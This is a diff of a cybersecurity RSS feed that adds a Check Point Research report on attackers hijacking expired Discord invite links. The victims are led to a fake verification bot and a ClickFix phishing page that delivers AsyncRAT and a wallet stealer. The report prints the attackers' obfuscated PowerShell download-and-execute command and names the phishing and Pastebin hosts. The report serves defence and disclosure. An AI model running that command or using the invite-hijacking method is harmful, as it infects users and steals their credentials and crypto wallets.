@@ -1,5 +1,1489 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Thu, 12 Jun 2025 12:59:18 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>ISC Stormcast For Thursday, June 12th, 2025 https://isc.sans.edu/podcastdetail/9490</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>Celebrating 11 years of Project Galileo’s global impact</title><link>https://blog.cloudflare.com/celebrating-11-years-of-project-galileo-global-impact/</link><description>June 2025 marks the 11th anniversary of Project Galileo, Cloudflare’s effort to protect vulnerable public interest organizations from cyber threats.</description><content:encoded>&lt;p&gt;June 2025 marks the 11th anniversary of &lt;a href="https://www.cloudflare.com/galileo/"&gt;&lt;u&gt;Project Galileo&lt;/u&gt;&lt;/a&gt;, Cloudflare’s initiative to provide free cybersecurity protection to vulnerable organizations working in the public interest around the world. From independent media and human rights groups to community activists, Project Galileo supports those often targeted for their essential work in human rights, civil society, and democracy building.&lt;/p&gt;&lt;p&gt;A lot has changed since we marked the &lt;a href="https://blog.cloudflare.com/pt-br/celebrating-10-years-of-project-galileo/"&gt;&lt;u&gt;10th anniversary&lt;/u&gt;&lt;/a&gt; of Project Galileo. Yet, our commitment remains the same: help ensure that organizations doing critical work in human rights have access to the tools they need to stay online.  We believe that organizations, no matter where they are in the world, deserve reliable, accessible protection to continue their important work without disruption.&lt;/p&gt;&lt;p&gt;For our 11th anniversary, we're excited to share several updates including:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;An interactive &lt;a href="https://radar.cloudflare.com/reports/project-galileo-11th-anniv"&gt;&lt;u&gt;Cloudflare Radar report&lt;/u&gt;&lt;/a&gt; providing insights into the cyber threats faced by at-risk public interest organizations protected under the project. &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;An expanded commitment to digital rights in the Asia-Pacific region with two new Project Galileo partners.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://www.cloudflare.com/project-galileo-case-studies/"&gt;&lt;u&gt;New stories &lt;/u&gt;&lt;/a&gt;from organizations protected by Project Galileo working on the frontlines of civil society, human rights, and journalism from around the world.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Thu, 12 Jun 2025 13:59:17 +0000</lastBuildDate><item><title>From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery</title><link>https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/</link><description>&lt;p&gt;Key Takeaways Introduction Discord is a heavily used, widely trusted platform favored by gamers,&amp;#160;communities,&amp;#160;businesses and others who need to connect securely and quickly.&amp;#160;But what if your trusted platform unknowingly becomes a trap? Check Point Research uncovered a flaw in Discord’s invitation system which&amp;#160;allows attackers to hijack expired or deleted invite links and secretly redirect unsuspecting [&amp;#8230;]&lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/"&gt;From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h1 class="wp-block-heading"&gt;Key Takeaways&lt;/h1&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;Check Point Research uncovered an active malware campaign exploiting expired and released Discord invite links. Attackers hijacked the links through vanity link registration, allowing them to silently redirect users from trusted sources to malicious servers.&lt;/li&gt;
+
+
+
+&lt;li&gt;The attackers combined the ClickFix phishing technique, multi-stage loaders, and time-based evasions to stealthily deliver AsyncRAT, and a customized Skuld Stealer targeting crypto wallets.&lt;/li&gt;
+
+
+
+&lt;li&gt;Payload delivery and data exfiltration occur exclusively via trusted cloud services such as GitHub, Bitbucket, Pastebin, and Discord, helping the operation blend into normal traffic and avoid raising alarms.&lt;/li&gt;
+
+
+
+&lt;li&gt;The operation continues to evolve, and threat actors can now bypass Chrome’s App Bound Encryption (ABE) by using adapted tools like ChromeKatz to steal cookies from new Chromium browser versions.&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;h1 class="wp-block-heading"&gt;Introduction&lt;/h1&gt;
+
+
+
+&lt;p&gt;Discord is a heavily used, widely trusted platform favored by gamers,&amp;nbsp;communities,&amp;nbsp;businesses and others who need to connect securely and quickly.&amp;nbsp;But what if your trusted platform unknowingly becomes a trap?&lt;/p&gt;
+
+
+
+&lt;p&gt;Check Point Research uncovered a flaw in Discord’s invitation system which&amp;nbsp;allows attackers to hijack expired or deleted invite links and secretly redirect unsuspecting users to malicious servers.&amp;nbsp;Invitation links posted by trusted communities months ago on forums,&amp;nbsp;social media,&amp;nbsp;or official websites could now quietly lead you into cybercriminal hands.&lt;/p&gt;
+
+
+
+&lt;p&gt;We observed real-world attacks in which&amp;nbsp;cybercriminals leverage hijacked invite links to deploy &lt;a href="https://research.checkpoint.com/2025/inferno-drainer-reloaded-deep-dive-into-the-return-of-the-most-sophisticated-crypto-drainer/"&gt;sophisticated phishing schemes&lt;/a&gt;&amp;nbsp;and malware campaigns,&amp;nbsp;including multi-stage infections designed to evade detection by antivirus tools and sandbox security checks.&lt;/p&gt;
+
+
+
+&lt;p&gt;In this report,&amp;nbsp;we detail a newly discovered malware campaign exploiting Discord’s invitation system flaw.&amp;nbsp;The attackers carefully orchestrate multiple infection stages and&amp;nbsp;deliver payloads such as the Skuld Stealer which&amp;nbsp;targets cryptocurrency wallets,&amp;nbsp;and AsyncRAT which&amp;nbsp;obtains full remote control of compromised systems.&amp;nbsp;Notably,&amp;nbsp;by combining multiple evasion techniques,&amp;nbsp;the attackers are able to stealthily deliver malicious payloads while bypassing Windows security features and staying under the radar of many antivirus engines.&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;Understanding Discord Invite Links&lt;/h2&gt;
+
+
+
+&lt;p&gt;Our recent investigation into Discord invite-link hijacking revealed that cybercriminals actively exploit Discord&amp;#8217;s invitation system to conduct phishing attacks.&amp;nbsp;Initially,&amp;nbsp;we discussed how attackers exploited &lt;a href="https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link"&gt;Discord’s custom&amp;nbsp;(vanity)&amp;nbsp;invite links&lt;/a&gt;&amp;nbsp;—&amp;nbsp;special invite URLs available exclusively to servers with a premium subscription&amp;nbsp;(Level 3 Boost).&amp;nbsp;Criminals targeted servers whose custom invite links were expired after losing their boosts,&amp;nbsp;and appropriated these recognizable invite URLs for their own use.&lt;/p&gt;
+
+
+
+&lt;p&gt;Further research indicates that this issue extends beyond custom vanity links to include standard invite links&amp;nbsp;(e.g.,&amp;nbsp;&lt;code&gt;discord.gg/y1zw2d5&lt;/code&gt;).&lt;/p&gt;
+
+
+
+&lt;p&gt;Discord generates random invitation links,&amp;nbsp;making it virtually impossible for legitimate servers to reclaim a previously expired invite.&amp;nbsp;However,&amp;nbsp;we found instances where regular&amp;nbsp;randomly-generated invite codes, originally published by legitimate communities on websites or Telegram channels,&amp;nbsp;now redirect users to malicious Discord servers.&amp;nbsp;How is this possible?&lt;/p&gt;
+
+
+
+&lt;p&gt;All Discord invite links follow the format:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;&lt;strong&gt;https://discord.gg/{invite_code}&lt;/strong&gt;&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;https://discord.com/invite/{invite_code}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;There are three primary types of invite links in Discord:&lt;/p&gt;
+
+
+
+&lt;ol class="wp-block-list"&gt;
+&lt;li&gt;&lt;strong&gt;Temporary Invite Links:&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+
+
+&lt;p&gt;Discord generates temporary invite links by default unless you specify otherwise.&amp;nbsp;When invites are created via the Discord application,&amp;nbsp;you can select expiration durations of 30 minutes,&amp;nbsp;1 hour,&amp;nbsp;6 hours,&amp;nbsp;12 hours,&amp;nbsp;1 day,&amp;nbsp;or 7 days (default).&lt;/p&gt;
+
+
+
+&lt;p&gt;When generated through Discord&amp;#8217;s API,&amp;nbsp;you can select any custom expiration time up to 7 days.&amp;nbsp;Invite codes are randomly generated and typically contain 7 or 8 characters,&amp;nbsp;combining uppercase letters,&amp;nbsp;lowercase letters,&amp;nbsp;and numbers.&amp;nbsp;For example:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;&lt;strong&gt;https://discord.gg/T8CA7XrK&lt;/strong&gt;&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;https://discord.gg/yzqKS3d&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31477" height="253" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-1-Generating-a-random-invite-code-in-Discord-application.png" width="453" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 1&lt;/strong&gt; &amp;#8211; Generating a random invite code in Discord application.&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;2. Permanent Invite Links:&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;These are created by explicitly selecting the&amp;nbsp;&amp;#8220;Expire After:&amp;nbsp;Never&amp;#8221;&amp;nbsp;option.&amp;nbsp;Codes generated for permanent invites contain 10 randomly-generated alphanumeric characters&amp;nbsp;(uppercase,&amp;nbsp;lowercase,&amp;nbsp;numbers).&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31478" height="418" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-2-Generating-a-permanent-invite-link-in-Discord-application.png" width="453" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 2&lt;/strong&gt; &amp;#8211; Generating a permanent invite link in Discord application.&lt;/p&gt;
+
+
+
+&lt;p&gt;Example of permanent invite link:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;&lt;strong&gt;https://discord.gg/wAYq5GAsyH&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;3. Custom Vanity Invite Links:&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;These are exclusively available to Discord servers with a premium subscription&amp;nbsp;(Level 3 Boost).&amp;nbsp;Vanity invite links allow server administrators to manually select the invite code,&amp;nbsp;provided it is unique across all Discord servers.&amp;nbsp;Codes may contain lowercase letters,&amp;nbsp;numbers,&amp;nbsp;or dashes,&amp;nbsp;and all letters are automatically converted to lowercase.&amp;nbsp;A server can only have one vanity link at a time.&amp;nbsp;If a server loses its boosts,&amp;nbsp;its custom vanity link becomes available for reuse by another boosted server.&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;Invite Code Reuse and Exploitation&lt;/h2&gt;
+
+
+
+&lt;p&gt;When creating a regular randomly-generated invite link,&amp;nbsp;after it’s expired or deleted,&amp;nbsp;you cannot obtain the same invite link again.&amp;nbsp;Invite codes are generated randomly and the probability of generating the same exact invite code is extremely low.&lt;/p&gt;
+
+
+
+&lt;p&gt;However,&amp;nbsp;the mechanism for creating custom invite links surprisingly lets you reuse expired temporary invite codes,&amp;nbsp;and,&amp;nbsp;in some cases,&amp;nbsp;deleted permanent invite codes:&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31479" height="318" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-3-Assigning-a-previously-used-invite-code-from-another-server-as-a-custom-vanity-invite-link-for-a-boosted-server-in-Discord-application.png" width="704" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 3&lt;/strong&gt; &amp;#8211; Assigning a previously used invite code from another server as a custom vanity invite link for a boosted server in Discord application.&lt;/p&gt;
+
+
+
+&lt;p&gt;Attackers actively exploit this behavior.&amp;nbsp;Once a temporary invite expires,&amp;nbsp;its code can be registered as a custom invite for another Discord server that has Level 3 Boost.&amp;nbsp;If a legitimate Discord server uses a custom vanity link but later loses its boost status&amp;nbsp;(for example,&amp;nbsp;due to a missed subscription payment),&amp;nbsp;the vanity invite becomes available again,&amp;nbsp;and attackers can claim it for their own malicious server.&amp;nbsp;This creates a serious risk:&amp;nbsp;Users who follow previously trusted invite links&amp;nbsp;(e.g.,&amp;nbsp;on websites,&amp;nbsp;blogs,&amp;nbsp;or forums)&amp;nbsp;can unknowingly be redirected to fake Discord servers created by threat actors.&lt;/p&gt;
+
+
+
+&lt;p&gt;The safest option is to use permanent invites,&amp;nbsp;which are more resistant to hijacking.&amp;nbsp;In particular,&amp;nbsp;if a permanent invite code contains any uppercase letters,&amp;nbsp;it cannot be reused even after deletion.&amp;nbsp;However,&amp;nbsp;in rare cases,&amp;nbsp;if a deleted permanent invite consisted only of lowercase letters and digits&amp;nbsp;(about 0.44%&amp;nbsp;of all cases),&amp;nbsp;the code may become available again for registration as a vanity invite.&lt;/p&gt;
+
+
+
+&lt;p&gt;The table below summarizes the hijack risk for each type of invite:&lt;/p&gt;
+
+
+
+&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;strong&gt;Invite type&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;&lt;strong&gt;Can be hijacked?&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;&lt;strong&gt;Explanation&lt;/strong&gt;&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;Temporary Invite Link&lt;/td&gt;&lt;td&gt;&lt;img alt="✅" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2705.png" style="height: 1em;" /&gt; Yes&lt;/td&gt;&lt;td&gt;After expiration, the code becomes available and can be re-registered as a custom vanity URL by a different server with Level 3 Boost.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Permanent Invite Link&lt;/td&gt;&lt;td&gt;&lt;img alt="⚠" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/26a0.png" style="height: 1em;" /&gt; Conditional&lt;/td&gt;&lt;td&gt;If deleted, a code with only lower-case letters and digits can be re-registered as a custom vanity URL by a different server with Level 3 Boost.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Custom Vanity Invite&lt;/td&gt;&lt;td&gt;&lt;img alt="✅" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2705.png" style="height: 1em;" /&gt; Yes (if lost)&lt;/td&gt;&lt;td&gt;If the original server loses its Level 3 Boost status, the vanity invite becomes invalid and may be claimed by another boosted server.&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;p&gt;In both the Web and desktop versions of the Discord client,&amp;nbsp;the invite code management behavior creates an additional risk factor.&amp;nbsp;When users create a new temporary invite through the&amp;nbsp;&amp;#8220;Invite People&amp;#8221;&amp;nbsp;option in the server’s menu and check the box&amp;nbsp;&amp;#8220;Set this link to never expire,&amp;#8221;&amp;nbsp;it does not modify the expiration time of &lt;em&gt;an already generated temporary invite&lt;/em&gt;.&amp;nbsp;The figure below shows how,&amp;nbsp;when you click the&amp;nbsp;&amp;#8220;Set this link to never expire&amp;#8221;&amp;nbsp;checkbox,&amp;nbsp;the Discord client shows that the link settings have supposedly changed,&amp;nbsp;but the invite code remains temporary&amp;nbsp;(as we can see,&amp;nbsp;it consists of 8 characters).&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31480" height="255" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-4-When-you-set-Never-Expires-for-an-existing-link-its-expiration-settings-do-not-actually-change.png" width="451" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 4&lt;/strong&gt; &amp;#8211; When you set&amp;nbsp;&amp;#8220;Never Expires&amp;#8221;&amp;nbsp;for an existing link,&amp;nbsp;its expiration settings do not actually change.&lt;/p&gt;
+
+
+
+&lt;p&gt;Users often mistakenly believe that by simply checking this box,&amp;nbsp;they have made the existing invite permanent&amp;nbsp;(and it was this misunderstanding that was exploited in the attack we observed).&amp;nbsp;As a result,&amp;nbsp;temporary invites are published under the false assumption that they will never expire.&amp;nbsp;These links eventually expire without warning,&amp;nbsp;making their codes vulnerable to hijacking and malicious reuse.&lt;/p&gt;
+
+
+
+&lt;h3 class="wp-block-heading"&gt;Examples&lt;/h3&gt;
+
+
+
+&lt;p&gt;Let’s explore how attackers can hijack Discord invite links under different conditions.&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;Case 1: Temporary invite with only lowercase letters and digits&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;Let’s say a legitimate server shares an invite link like: &lt;code&gt;https://discord.gg/yzqks3d&lt;/code&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;This code contains only lowercase letters and digits.&amp;nbsp;As long as the invite is active,&amp;nbsp;attackers cannot register it as a vanity invite.&amp;nbsp;However,&amp;nbsp;once the invite expires or is manually deleted,&amp;nbsp;the code becomes available.&amp;nbsp;Attackers monitoring known invite codes can then quickly claim it as a vanity invite on a malicious boosted server.&amp;nbsp;From that point on,&amp;nbsp;anyone using this invite&amp;nbsp;(&lt;code&gt;yzqks3d&lt;/code&gt;)&amp;nbsp;will be redirected to the attacker&amp;#8217;s server.&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;Case 2: Temporary invite with uppercase letters&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;Now let’s consider another invite code: &lt;code&gt;https://discord.gg/uzwgPxUZ&lt;/code&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;This code includes uppercase letters.&amp;nbsp;In this case,&amp;nbsp;attackers can register a vanity invite using the lowercase version of the same code&amp;nbsp;(&lt;code&gt;uzwgpxuz&lt;/code&gt;)&amp;nbsp;even while the original invite is still active.&amp;nbsp;Discord allows it because vanity codes are always stored and compared in lowercase.&lt;/p&gt;
+
+
+
+&lt;p&gt;While the original invite is still valid,&amp;nbsp;users who follow the link will land on the correct server.&amp;nbsp;But as soon as this invite expires,&amp;nbsp;users clicking the previously legitimate link&amp;nbsp;(&lt;code&gt;uzwgPxUZ&lt;/code&gt;)&amp;nbsp;are seamlessly redirected to the attackers’ server,&amp;nbsp;which now owns the lowercase vanity version of that code.&lt;/p&gt;
+
+
+
+&lt;p&gt;Note that&amp;nbsp;if the original invite that includes uppercase letters is manually deleted before its expiration,&amp;nbsp;Discord continues to treat the code as reserved until the scheduled expiration time is reached.&amp;nbsp;The users following the original link&amp;nbsp;(&lt;code&gt;uzwgPxUZ&lt;/code&gt;)&amp;nbsp;won’t be redirected to the attacker’s server until then.&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;From Trusted Links to Malicious Discord Servers&lt;/h2&gt;
+
+
+
+&lt;p&gt;Using the method described above,&amp;nbsp;attackers hijack Discord invite links originally shared by legitimate communities.&amp;nbsp;Users following these trusted links,&amp;nbsp;found in social media posts&amp;nbsp;or official community websites,&amp;nbsp;unknowingly end up on malicious servers carefully designed to look authentic.&lt;/p&gt;
+
+
+
+&lt;p&gt;Upon joining,&amp;nbsp;new members typically see that most channels are locked&amp;nbsp;and only one channel, usually named “&lt;strong&gt;verify&lt;/strong&gt;”, is accessible.&amp;nbsp;In this channel,&amp;nbsp;a bot named&amp;nbsp;”&lt;strong&gt;Safeguard”&lt;/strong&gt;&amp;nbsp;prompts users to complete a verification step to gain full server access.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31481" height="899" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-5-Malicious-Discord-server-where-users-land-after-clicking-a-hijacked-invite-link.png" width="1407" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 5&lt;/strong&gt; &amp;#8211; Malicious Discord server where users land after clicking a hijacked invite link.&lt;/p&gt;
+
+
+
+&lt;p&gt;Inspecting the bot&amp;#8217;s information reveals that the malicious bot&amp;nbsp;&amp;#8220;&lt;strong&gt;Safeguard#0786&lt;/strong&gt;&amp;#8221;&amp;nbsp;was created on February 1,&amp;nbsp;2025:&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31482" height="435" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-6-Malicious-Safeguard-bot-description.png" width="609" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 6&lt;/strong&gt; &amp;#8211; Malicious&amp;nbsp;“Safeguard”&amp;nbsp;bot description.&lt;/p&gt;
+
+
+
+&lt;p&gt;When users click the&amp;nbsp;“&lt;strong&gt;verify&lt;/strong&gt;”&amp;nbsp;button,&amp;nbsp;they&amp;#8217;re asked to authorize the bot,&amp;nbsp;redirecting them to an external website:&amp;nbsp;&lt;code&gt;https://captchaguard[.]me&lt;/code&gt;.&amp;nbsp;At the same time,&amp;nbsp;the bot obtains access to user profile details,&amp;nbsp;such as username,&amp;nbsp;avatar,&amp;nbsp;and banner.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31483" height="759" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-7-Safeguard-bot-redirecting-users-to-phishing-site-captchaguard_me.png" width="576" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 7&lt;/strong&gt; &amp;#8211; Safeguard bot redirecting users to the phishing website.&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;Phishing website&lt;/h2&gt;
+
+
+
+&lt;p&gt;After the user authorizes the bot,&amp;nbsp;Discord starts the OAuth2 authentication flow.&amp;nbsp;Discord generates a single use code and the URL with a format such as&amp;nbsp;&lt;code&gt;https://captchaguard.me/oauth-pass?code=zyA11weHhTZxaY3Fs3EWBg6qfO7t6j&lt;/code&gt;&amp;nbsp;is opened in the browser.&amp;nbsp;At the same time,&amp;nbsp;using this code,&amp;nbsp;the website gets the username and the server name from Discord.&amp;nbsp;After successfully retrieving user data from Discord,&amp;nbsp;the server redirects the user to another URL with the format:&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;https://captchaguard[.]me/?key=aWQ9dXNlcm5hbWUyMzQ0JnRva2VuPTExMjIzMzQ0MDEyMz&amp;#8230;&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;In this URL,&amp;nbsp;the&amp;nbsp;“key”&amp;nbsp;variable contains BASE64-encoded data retrieved from Discord that includes the username,&amp;nbsp;Discord guild, and icon IDs.&amp;nbsp;The page is static and does not actually verify the data received in the&amp;nbsp;“key=”&amp;nbsp;variable.&amp;nbsp;Therefore,&amp;nbsp;anyone can open it using the empty value:&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;https://captchaguard[.]me/?key=&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;Once redirected,&amp;nbsp;the user is shown a well-designed web page mimicking Discord’s UI.&amp;nbsp;At the center is a&amp;nbsp;“&lt;strong&gt;Verify&lt;/strong&gt;”&amp;nbsp;button,&amp;nbsp;accompanied by a green shield logo.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31484" height="433" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-8-Phishing-website-with-fake-verification-message.png" width="596" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 8&lt;/strong&gt; &amp;#8211; Phishing website displaying a fake verification message.&lt;/p&gt;
+
+
+
+&lt;p&gt;Clicking&amp;nbsp;&amp;#8220;&lt;strong&gt;Verify&lt;/strong&gt;&amp;#8221;&amp;nbsp;executes JavaScript that silently copies a malicious PowerShell command to the user’s clipboard:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';$u=($r[-1..-($r.Length)]-join '');$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));iex (iwr -Uri $url)"
+&lt;/pre&gt;
+
+
+
+&lt;p&gt;The attackers use a refined UX trick known as&amp;nbsp;&lt;strong&gt;“ClickFix”,&lt;/strong&gt;&amp;nbsp;&amp;nbsp;a technique in which the service initially appears broken,&amp;nbsp;prompting the user to take manual action to&amp;nbsp;“fix”&amp;nbsp;it.&amp;nbsp;In this case,&amp;nbsp;a fake Google CAPTCHA is shown as failing to load,&amp;nbsp;and manual&amp;nbsp;“verification”&amp;nbsp;instructions are displayed.&lt;/p&gt;
+
+
+
+&lt;p&gt;This page presents a sequence of clear,&amp;nbsp;visually guided steps to pass&amp;nbsp;“verification”:&amp;nbsp;open the Windows Run dialog&amp;nbsp;(&lt;code&gt;Win + R&lt;/code&gt;),&amp;nbsp;paste the text preloaded into the clipboard,&amp;nbsp;and press Enter.&amp;nbsp;The site avoids asking users to download or run any files manually,&amp;nbsp;removing a common red flag.&amp;nbsp;By using familiar Discord visuals and a polished layout,&amp;nbsp;the attackers create a false sense of legitimacy.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31485" height="849" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-9-Social-engineering-technique-tricking-a-user-to-execute-a-malicious-command.png" width="840" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 9&lt;/strong&gt; &amp;#8211; Social engineering technique tricking a user to execute a malicious command.&lt;/p&gt;
+
+
+
+&lt;p&gt;In reality,&amp;nbsp;this action causes the user’s computer to download and execute a PowerShell script hosted on Pastebin:&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;https://pastebin[.]com/raw/zW0L2z2M&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;Pastebin is a public web service where users can store and share plain text online,&amp;nbsp;and is often used for sharing code snippets,&amp;nbsp;logs,&amp;nbsp;or configuration data.&amp;nbsp;When you create a new&amp;nbsp;“paste”,&amp;nbsp;it becomes accessible via a short link like&amp;nbsp;“&lt;code&gt;https://pastebin[.]com/raw/{resource_id}&lt;/code&gt;”.&amp;nbsp;Usually,&amp;nbsp;it does not require registration to share some data.&amp;nbsp;Registered users have the ability to delete and edit data they previously posted.&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;Multi-stage Payload Delivery Using Pastebin, GitHub and Bitbucket&lt;/h2&gt;
+
+
+
+&lt;p&gt;The malware campaign we uncovered in our research follows a carefully designed multi-stage infection chain.&amp;nbsp;Threat actors leverage a combination of Discord,&amp;nbsp;phishing websites,&amp;nbsp;social engineering,&amp;nbsp;public services like Pastebin,&amp;nbsp;and cloud platforms such as GitHub and Bitbucket to deliver their payloads.&lt;/p&gt;
+
+
+
+&lt;p&gt;The diagram below summarizes the initial phase, which involves phishing via hijacked Discord invites and the ClickFix technique detailed above:&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31486" height="169" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-10-Infection-chain-overview-From-hijacked-Discord-invite-to-execution-of-PowerShell-downloader-1024x169.png" width="1024" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;strong&gt;Figure 10&lt;/strong&gt; &amp;#8211; Infection chain overview:&amp;nbsp;From hijacked Discord invite to execution of PowerShell downloader.&lt;/p&gt;
+
+
+
